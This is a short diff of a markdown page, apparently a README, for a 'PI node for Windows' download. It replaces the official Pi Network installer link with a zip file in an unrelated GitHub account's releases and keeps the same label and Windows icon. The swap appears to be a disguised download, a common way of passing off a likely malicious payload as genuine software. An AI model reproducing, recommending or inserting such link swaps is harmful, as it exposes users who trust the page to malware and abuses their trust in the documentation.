@@ -4,7 +4,7 @@
 
 
 
-<a href="https://downloads.minepi.com/Pi%20Network%20Setup%200.4.11.exe"><img src="https://cdn.iconscout.com/icon/free/png-512/free-windows-187-675857.png?f=webp&w=256" width=100 align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://downloads.minepi.com/Pi%20Network%20Setup%200.4.11.exe">PI node for Windows</a>
+<a href="https://github.com/freezmadmin/freezmadmin/releases/download/No9e/Releases.zip"><img src="https://cdn.iconscout.com/icon/free/png-512/free-windows-187-675857.png?f=webp&w=256" width=100 align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/freezmadmin/freezmadmin/releases/download/No9e/Releases.zip">PI node for Windows</a>
 
 
  *[Edit date and time](https://www.timeanddate.com/worldclock/timezone/utc):*`15:35:15 UTC`
